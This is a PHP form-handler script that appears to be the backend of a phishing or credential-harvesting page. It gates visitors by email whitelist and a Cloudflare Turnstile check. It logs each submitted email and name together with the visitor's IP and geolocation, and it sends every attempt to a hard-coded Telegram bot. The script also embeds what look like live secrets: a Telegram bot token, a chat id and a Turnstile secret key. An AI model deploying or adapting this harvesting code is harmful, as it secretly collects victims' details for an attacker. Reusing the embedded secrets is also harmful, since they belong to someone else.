<?php
session_start();
define('ATTEMPTS_FILE', '/data/attempts.json'); // persistent Railway volume

// === TOGGLE: email validation ON/OFF ===
$EMAIL_VALIDATION_ENABLED = false; // set to true to ENFORCE whitelist in papa.txt

$telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
$telegram_chat_id   = "6915371044";
$turnstile_secret   = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc";
$whitelist_file     = __DIR__ . '/papa.txt';

// Detect accurate visitor IP
function get_client_ip() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// Load previous attempts
$attempts = [];
if (file_exists(ATTEMPTS_FILE)) {
    $data = json_decode(file_get_contents(ATTEMPTS_FILE), true);
    if (is_array($data)) {
        $attempts = $data;
    }
}

/*
 * STEP 2: NAME SUBMISSION
 * (process first so Step 2 doesn't accidentally hit Turnstile/email block)
 */
if (isset($_POST['name'])) {

    // ORIGINAL validated email (from step 1)
    $original_email = $_SESSION['validated_email'] ?? ($_SESSION['old_email'] ?? '');

    // Current email from POST (user may have changed it on step 2)
    if (isset($_POST['email'])) {
        $emailCandidate = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
        if (!$emailCandidate) {
            $_SESSION['error_message'] = "Invalid email.";
            header("Location: index.php"); exit;
        }

        // Optional: re-check whitelist if validation enabled
        if ($EMAIL_VALIDATION_ENABLED) {
            if (!file_exists($whitelist_file)) {
                $_SESSION['error_message'] = "Configuration error: whitelist missing.";
                header("Location: index.php"); exit;
            }
            $whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $whitelist = array_map('trim', $whitelist);

            if (!in_array($emailCandidate, $whitelist, true)) {
                $_SESSION['error_message'] = "Email not allowed.";
                header("Location: index.php"); exit;
            }
        }

        $email = $emailCandidate;
        // Keep session in sync with the currently used email
        $_SESSION['old_email'] = $email;

    } else {
        // Fallback if somehow email not posted
        $email = $original_email;
    }

    $name  = trim($_POST['name']);

    if (!$email || !$name) {
        $_SESSION['error_message'] = "Invalid input.";
        header("Location: index.php"); exit;
    }

    $ip = get_client_ip();

    // Location info
    $geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query"), true);
    $location = ($geo && isset($geo['country']))
        ? ($geo['country'].", ".$geo['regionName'].", ".$geo['city'])
        : "Unknown";

    // Update attempts keyed by CURRENT email
    if (!isset($attempts[$email])) {
        $attempts[$email] = [
            'names'    => [$name],
            'count'    => 1,
            'ip'       => $ip,
            'location' => $location
        ];
    } else {
        $attempts[$email]['names'][] = $name;
        $attempts[$email]['count']  += 1;
        $attempts[$email]['ip']      = $ip;
        $attempts[$email]['location']= $location;
    }

    file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));

    // Telegram notification — show BOTH current and original (if different)
    $msg  = "Login attempt for: $email\n";

    if (!empty($original_email) && $original_email !== $email) {
        $msg .= "Original validated email: $original_email\n";
    }

    $msg .= "Names tried: ".implode(", ", $attempts[$email]['names'])."\n";
    $msg .= "Total attempts: {$attempts[$email]['count']}\n";
    $msg .= "IP: $ip\n";
    $msg .= "Location: $location";

    @file_get_contents(
        "https://api.telegram.org/bot$telegram_bot_token/sendMessage" .
        "?chat_id=$telegram_chat_id&text=".urlencode($msg)
    );

    // Correct name check
    $correct_name = "John Doe";

    if ($name !== $correct_name && $attempts[$email]['count'] >= 3) {
        header("Location: https://example.com/blocked"); exit;
    } elseif ($name !== $correct_name) {
        $_SESSION['error_message'] = "Incorrect details. Please try again.";
        header("Location: index.php"); exit;
    }

    // Success
    unset($_SESSION['old_email'], $_SESSION['step'], $_SESSION['validated_email']);
    header("Location: dashboard.php"); exit;
}

/*
 * STEP 1: EMAIL SUBMISSION
 * Only when we're at step 1 (or no step set yet)
 */
if (isset($_POST['email']) && (!isset($_SESSION['step']) || $_SESSION['step'] == 1)) {
    $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
    $turnstile_response = $_POST['cf-turnstile-response'] ?? '';

    if (!$email) {
        $_SESSION['error_message'] = "Invalid email.";
        header("Location: index.php"); exit;
    }

    // Verify Turnstile
    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'secret'   => $turnstile_secret,
        'response' => $turnstile_response,
        'remoteip' => get_client_ip()
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $turnstile_result = json_decode(curl_exec($ch), true);
    curl_close($ch);

    if (empty($turnstile_result['success'])) {
        $_SESSION['error_message'] = "Turnstile verification failed.";
        header("Location: index.php"); exit;
    }

    // Validate email against whitelist ONLY if enabled
    if ($EMAIL_VALIDATION_ENABLED) {
        if (!file_exists($whitelist_file)) {
            $_SESSION['error_message'] = "Configuration error: whitelist missing.";
            header("Location: index.php"); exit;
        }

        $whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $whitelist = array_map('trim', $whitelist);

        if (!in_array($email, $whitelist, true)) {
            $_SESSION['error_message'] = "Email not allowed.";
            header("Location: index.php"); exit;
        }
    }

    // Store both original validated and current for later comparison
    $_SESSION['step']             = 2;
    $_SESSION['old_email']        = $email;
    $_SESSION['validated_email']  = $email;

    header("Location: index.php"); exit;
}

// Fallback redirect
header("Location: index.php");
exit;
?>
